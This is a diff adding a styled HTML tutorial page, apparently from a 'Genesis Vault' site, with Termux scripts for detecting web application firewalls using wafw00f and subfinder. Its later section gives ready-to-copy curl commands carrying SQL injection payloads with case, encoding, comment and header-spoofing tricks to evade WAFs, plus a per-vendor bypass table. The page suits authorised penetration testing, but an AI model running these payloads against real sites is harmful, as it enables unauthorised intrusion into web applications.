@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WAF Detector Script — Genesis Vault</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0f;
+    --bg2: #0a1520;
+    --bg3: #0d1e2e;
+    --cyan: #00f5c4;
+    --cyan2: #00c49a;
+    --red: #ff3b5c;
+    --yellow: #f5c400;
+    --green: #39ff14;
+    --purple: #a855f7;
+    --text: #c8dde8;
+    --muted: #4a6a7a;
+    --border: #1a3a4a;
+    --glow: 0 0 18px rgba(0,245,196,0.25);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; min-height: 100vh; overflow-x: hidden; }
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: linear-gradient(rgba(0,245,196,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,245,196,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none; z-index: 0;
+  }
+  .wrap { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; padding: 24px 16px 60px; }
+
+  .header { border-bottom: 1px solid var(--border); padding-bottom: 20px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+  .logo { font-family: 'Share Tech Mono', monospace; font-size: 13px; letter-spacing: 3px; color: var(--cyan); }
+  .logo span { color: var(--text); }
+  .badges { display: flex; gap: 8px; flex-wrap: wrap; }
+  .badge { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 2px; padding: 4px 10px; border: 1px solid; }
+  .badge.cyan { border-color: var(--cyan); color: var(--cyan); }
+  .badge.purple { border-color: var(--purple); color: var(--purple); }
+
+  .title-block { margin-bottom: 24px; }
+  .label { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--muted); margin-bottom: 8px; }
+  .label::before { content: '// '; color: var(--cyan); }
+  h1 { font-size: clamp(20px, 5vw, 32px); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #fff; }
+  h1 span { color: var(--cyan); }
+  .subtitle { margin-top: 8px; font-size: 15px; color: var(--muted); letter-spacing: 1px; }
+
+  /* What is WAF box */
+  .info-box {
+    background: rgba(0,245,196,0.04);
+    border: 1px solid rgba(0,245,196,0.2);
+    border-left: 3px solid var(--cyan);
+    padding: 16px 18px;
+    margin-bottom: 28px;
+  }
+  .info-box .info-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--cyan); margin-bottom: 8px; }
+  .info-box p { font-size: 14px; color: var(--text); line-height: 1.7; letter-spacing: 0.5px; }
+  .info-box p strong { color: var(--yellow); }
+
+  /* Section titles */
+  .sec-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--muted); margin-bottom: 14px; margin-top: 32px; }
+  .sec-title::before { content: '// '; color: var(--cyan); }
+
+  /* Script cards */
+  .script-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--cyan);
+    padding: 18px;
+    margin-bottom: 16px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .script-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, var(--cyan), transparent);
+    opacity: 0; transition: opacity 0.2s;
+  }
+  .script-card:hover { border-color: var(--cyan); background: var(--bg3); }
+  .script-card:hover::before { opacity: 1; }
+  .script-card.yellow { border-left-color: var(--yellow); }
+  .script-card.yellow::before { background: linear-gradient(90deg, var(--yellow), transparent); }
+  .script-card.purple { border-left-color: var(--purple); }
+  .script-card.purple::before { background: linear-gradient(90deg, var(--purple), transparent); }
+  .script-card.red { border-left-color: var(--red); }
+  .script-card.red::before { background: linear-gradient(90deg, var(--red), transparent); }
+
+  .card-header { display: flex; align-items: flex-start; justify-content: space-between; gap: 12px; margin-bottom: 8px; flex-wrap: wrap; }
+  .card-title { font-size: 15px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; color: #fff; }
+  .card-tag { font-family: 'Share Tech Mono', monospace; font-size: 9px; letter-spacing: 1.5px; padding: 3px 8px; border: 1px solid; text-transform: uppercase; }
+  .card-tag.basic { border-color: var(--cyan); color: var(--cyan); }
+  .card-tag.advanced { border-color: var(--yellow); color: var(--yellow); }
+  .card-tag.bypass { border-color: var(--red); color: var(--red); }
+  .card-tag.osint { border-color: var(--purple); color: var(--purple); }
+
+  .card-desc { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 12px; letter-spacing: 0.5px; }
+
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--cyan);
+    padding: 12px 14px;
+    margin-bottom: 10px;
+    line-height: 1.9;
+    overflow-x: auto;
+    white-space: pre;
+    cursor: pointer;
+    position: relative;
+    transition: border-color 0.2s;
+  }
+  .code-block:hover { border-color: var(--cyan2); }
+  .code-block .comment { color: var(--muted); }
+  .copy-row { display: flex; justify-content: flex-end; }
+  .copy-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    padding: 6px 14px;
+    border: 1px solid var(--cyan);
+    background: transparent;
+    color: var(--cyan);
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.2s;
+  }
+  .copy-btn:hover { background: rgba(0,245,196,0.1); box-shadow: var(--glow); }
+  .copy-btn.copied { border-color: var(--yellow); color: var(--yellow); }
+
+  /* WAF table */
+  .waf-table { width: 100%; border-collapse: collapse; margin-bottom: 24px; }
+  .waf-table th {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    text-align: left;
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    text-transform: uppercase;
+  }
+  .waf-table td {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(26,58,74,0.5);
+    vertical-align: top;
+  }
+  .waf-table tr:hover td { background: var(--bg2); }
+  .waf-name { color: var(--cyan); }
+  .waf-sign { color: var(--text); font-size: 11px; line-height: 1.6; }
+  .waf-bypass { color: var(--yellow); font-size: 11px; }
+
+  /* Install section */
+  .install-steps { counter-reset: step; }
+  .install-step {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 14px 16px 14px 52px;
+    margin-bottom: 10px;
+    position: relative;
+  }
+  .install-step::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: var(--cyan);
+    font-weight: 700;
+  }
+  .install-step .step-label { font-size: 13px; font-weight: 700; color: #fff; letter-spacing: 1px; margin-bottom: 4px; text-transform: uppercase; }
+  .install-step .step-desc { font-size: 13px; color: var(--muted); }
+
+  /* Output example */
+  .output-example {
+    background: #020a02;
+    border: 1px solid #1a4a1a;
+    border-left: 3px solid var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    padding: 16px;
+    line-height: 2;
+    margin-bottom: 24px;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .toast { position: fixed; bottom: 24px; right: 24px; background: var(--bg2); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 11px; letter-spacing: 2px; padding: 10px 20px; z-index: 999; opacity: 0; transform: translateY(10px); transition: all 0.3s; pointer-events: none; }
+  .toast.show { opacity: 1; transform: translateY(0); }
+
+  .warning { background: rgba(255,59,92,0.06); border: 1px solid rgba(255,59,92,0.3); border-left: 3px solid var(--red); padding: 12px 16px; font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--red); letter-spacing: 1px; margin-bottom: 24px; line-height: 1.6; }
+
+  .footer { margin-top: 48px; border-top: 1px solid var(--border); padding-top: 20px; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--muted); letter-spacing: 2px; text-align: center; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="header">
+    <div class="logo">GENESIS<span>VAULT</span></div>
+    <div class="badges">
+      <span class="badge cyan">SCRIPTS</span>
+      <span class="badge purple">RECON</span>
+    </div>
+  </div>
+
+  <div class="title-block">
+    <div class="label">SCRIPT TOOL — WAF DETECTION</div>
+    <h1>WAF <span>Detector</span></h1>
+    <div class="subtitle">Detect Web Application Firewalls using wafw00f — ready-to-run Termux scripts</div>
+  </div>
+
+  <div class="warning">⚠ FOR AUTHORIZED TESTING ONLY — Only scan targets you own or have explicit written permission to test.</div>
+
+  <div class="info-box">
+    <div class="info-title">// WHAT IS A WAF?</div>
+    <p>A <strong>Web Application Firewall (WAF)</strong> sits between a client and a web server, filtering malicious requests. Knowing which WAF is running lets you pick the right <strong>bypass technique</strong> — what works against Cloudflare won't work against AWS WAF. <strong>WAF detection is step one of any serious web pentest.</strong></p>
+  </div>
+
+  <!-- INSTALL -->
+  <div class="sec-title">STEP 1 — INSTALL WAFW00F IN TERMUX</div>
+  <div class="install-steps">
+    <div class="install-step">
+      <div class="step-label">Update Termux packages</div>
+      <div class="step-desc">Always update before installing new tools</div>
+    </div>
+    <div class="install-step">
+      <div class="step-label">Install Python & pip</div>
+      <div class="step-desc">wafw00f runs on Python 3</div>
+    </div>
+    <div class="install-step">
+      <div class="step-label">Install wafw00f via pip</div>
+      <div class="step-desc">Pulls the latest version from PyPI</div>
+    </div>
+    <div class="install-step">
+      <div class="step-label">Verify installation</div>
+      <div class="step-desc">Check the tool is working correctly</div>
+    </div>
+  </div>
+
+  <div class="script-card">
+    <div class="card-header">
+      <div class="card-title">📦 Installation Script</div>
+      <span class="card-tag basic">RUN ONCE</span>
+    </div>
+    <div class="card-desc">Run this once in Termux to install wafw00f and all dependencies.</div>
+    <div class="code-block" id="installScript"><span class="comment"># Update Termux</span>
+pkg update -y && pkg upgrade -y
+
+<span class="comment"># Install Python</span>
+pkg install python -y
+
+<span class="comment"># Install pip packages</span>
+pip install wafw00f
+
+<span class="comment"># Verify install</span>
+wafw00f --version</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('installScript', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <!-- BASIC SCRIPTS -->
+  <div class="sec-title">STEP 2 — BASIC DETECTION SCRIPTS</div>
+
+  <div class="script-card">
+    <div class="card-header">
+      <div class="card-title">🔍 Single Target Scan</div>
+      <span class="card-tag basic">BASIC</span>
+    </div>
+    <div class="card-desc">Detect the WAF on a single target. Replace the URL with your target.</div>
+    <div class="code-block" id="basicScan"><span class="comment"># Basic WAF detection</span>
+wafw00f https://target.com
+
+<span class="comment"># With verbose output</span>
+wafw00f -v https://target.com
+
+<span class="comment"># Test all WAFs (slower but thorough)</span>
+wafw00f -a https://target.com</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('basicScan', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <div class="script-card">
+    <div class="card-header">
+      <div class="card-title">📋 Bulk Target Scan</div>
+      <span class="card-tag basic">BASIC</span>
+    </div>
+    <div class="card-desc">Scan multiple targets from a list file. One URL per line in targets.txt.</div>
+    <div class="code-block" id="bulkScan"><span class="comment"># Create targets file</span>
+cat > targets.txt << 'EOF'
+https://target1.com
+https://target2.com
+https://target3.com
+EOF
+
+<span class="comment"># Scan all targets</span>
+wafw00f -i targets.txt
+
+<span class="comment"># Save results to file</span>
+wafw00f -i targets.txt -o results.txt</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('bulkScan', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <!-- ADVANCED SCRIPTS -->
+  <div class="sec-title">STEP 3 — ADVANCED SCRIPTS</div>
+
+  <div class="script-card yellow">
+    <div class="card-header">
+      <div class="card-title">🧠 Full Recon + WAF Script</div>
+      <span class="card-tag advanced">ADVANCED</span>
+    </div>
+    <div class="card-desc">Combines WAF detection with header grabbing and response analysis for a full picture.</div>
+    <div class="code-block" id="fullRecon"><span class="comment"># Full WAF recon script</span>
+TARGET="https://target.com"
+
+echo "[*] Target: $TARGET"
+echo ""
+
+<span class="comment"># Check headers first</span>
+echo "[*] Grabbing headers..."
+curl -sI $TARGET | grep -iE "server|x-powered|cf-ray|x-cache|via|x-waf"
+
+echo ""
+echo "[*] Running wafw00f..."
+wafw00f -a -v $TARGET
+
+echo ""
+echo "[*] Done."</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('fullRecon', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <div class="script-card yellow">
+    <div class="card-header">
+      <div class="card-title">🌐 Subdomain WAF Mapper</div>
+      <span class="card-tag advanced">ADVANCED</span>
+    </div>
+    <div class="card-desc">Maps WAFs across all subdomains of a target. Useful for bug bounty scope recon.</div>
+    <div class="code-block" id="subdomainWaf"><span class="comment"># Install subfinder first if needed</span>
+<span class="comment"># go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</span>
+
+DOMAIN="target.com"
+
+echo "[*] Finding subdomains for $DOMAIN..."
+subfinder -d $DOMAIN -silent > subs.txt
+
+echo "[*] Found $(wc -l < subs.txt) subdomains"
+echo "[*] Running WAF detection on each..."
+
+while read sub; do
+  echo -n "  $sub → "
+  wafw00f -a "https://$sub" 2>/dev/null | grep -oE "(No WAF|[A-Za-z]+ WAF)" | head -1
+done < subs.txt
+
+echo "[*] Scan complete."</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('subdomainWaf', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <!-- BYPASS SCRIPTS -->
+  <div class="sec-title">STEP 4 — AFTER DETECTION: BYPASS SCRIPTS</div>
+
+  <div class="script-card red">
+    <div class="card-header">
+      <div class="card-title">🛡️ Cloudflare Bypass Test</div>
+      <span class="card-tag bypass">BYPASS</span>
+    </div>
+    <div class="card-desc">After confirming Cloudflare WAF, test these bypass techniques with curl.</div>
+    <div class="code-block" id="cfBypass"><span class="comment"># Cloudflare bypass attempts</span>
+TARGET="https://target.com"
+
+<span class="comment"># 1. Case variation bypass</span>
+curl -s "$TARGET/?id=1+UnIoN+SeLeCt+1,2,3--"
+
+<span class="comment"># 2. URL encoding bypass</span>
+curl -s "$TARGET/?id=1%20UNION%20SELECT%201,2,3--"
+
+<span class="comment"># 3. Comment injection bypass</span>
+curl -s "$TARGET/?id=1+UN/**/ION+SE/**/LECT+1,2,3--"
+
+<span class="comment"># 4. Custom User-Agent spoof</span>
+curl -s -A "Googlebot/2.1" "$TARGET/?id=1 UNION SELECT 1,2,3--"</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('cfBypass', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <div class="script-card red">
+    <div class="card-header">
+      <div class="card-title">🔓 Generic WAF Bypass Headers</div>
+      <span class="card-tag bypass">BYPASS</span>
+    </div>
+    <div class="card-desc">Headers that trick WAFs into thinking the request is internal or trusted.</div>
+    <div class="code-block" id="headerBypass"><span class="comment"># Bypass using spoofed headers</span>
+TARGET="https://target.com"
+PAYLOAD="?id=1 UNION SELECT 1,2,3--"
+
+curl -s \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "X-Originating-IP: 127.0.0.1" \
+  -H "X-Remote-IP: 127.0.0.1" \
+  -H "X-Client-IP: 127.0.0.1" \
+  -H "CF-Connecting-IP: 127.0.0.1" \
+  "$TARGET$PAYLOAD"</div>
+    <div class="copy-row"><button class="copy-btn" onclick="copyBlock('headerBypass', this)">[ COPY SCRIPT ]</button></div>
+  </div>
+
+  <!-- WAF REFERENCE TABLE -->
+  <div class="sec-title">WAF REFERENCE — SIGNATURES & BYPASS HINTS</div>
+  <table class="waf-table">
+    <thead>
+      <tr>
+        <th>WAF</th>
+        <th>Detection Signs</th>
+        <th>Bypass Hint</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="waf-name">Cloudflare</td>
+        <td class="waf-sign">CF-Ray header, 403 with CF branding</td>
+        <td class="waf-bypass">Case mixing, chunked encoding</td>
+      </tr>
+      <tr>
+        <td class="waf-name">AWS WAF</td>
+        <td class="waf-sign">x-amzn-requestid, AWS error pages</td>
+        <td class="waf-bypass">JSON body injection, param pollution</td>
+      </tr>
+      <tr>
+        <td class="waf-name">Akamai</td>
+        <td class="waf-sign">AkamaiGHost, X-Check-Cacheable</td>
+        <td class="waf-bypass">Unicode encoding, slow HTTP</td>
+      </tr>
+      <tr>
+        <td class="waf-name">Imperva</td>
+        <td class="waf-sign">incap_ses cookie, visid_incap</td>
+        <td class="waf-bypass">Base64 encoding, multipart body</td>
+      </tr>
+      <tr>
+        <td class="waf-name">ModSecurity</td>
+        <td class="waf-sign">403 with ModSecurity in body</td>
+        <td class="waf-bypass">Comment insertion /**/, HPP</td>
+      </tr>
+      <tr>
+        <td class="waf-name">Sucuri</td>
+        <td class="waf-sign">X-Sucuri-ID, sucuri block page</td>
+        <td class="waf-bypass">IP whitelist, user-agent spoof</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- OUTPUT EXAMPLE -->
+  <div class="sec-title">EXAMPLE OUTPUT</div>
+  <div class="output-example">$ wafw00f -a https://target.com
+
+                   ______
+                  /      \
+                 (  W00f! )
+                  \______/
+                  ,,    ,,
+[*] Checking https://target.com
+[+] The site https://target.com is behind <span style="color:#fff">Cloudflare (Cloudflare Inc.)</span> WAF.
+[~] Number of requests: 2
+
+[*] Testing all WAFs...
+[+] Cloudflare      → <span style="color:#39ff14">DETECTED</span>
+[-] AWS WAF         → not detected
+[-] Akamai          → not detected
+[-] Imperva         → not detected
+
+[*] Scan complete.</div>
+
+  <div class="footer">// GENESIS VAULT — WAF DETECTOR SCRIPT — RECON — USE RESPONSIBLY</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+function copyBlock(id, btn) {
+  const block = document.getElementById(id);
+  const text = block.innerText.replace(/\n{3,}/g, '\n\n').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('SCRIPT COPIED');
+    btn.textContent = '[ COPIED ]';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = '[ COPY SCRIPT ]'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = '✓ ' + msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2000);
+}
+</script>
+</body>
+</html>
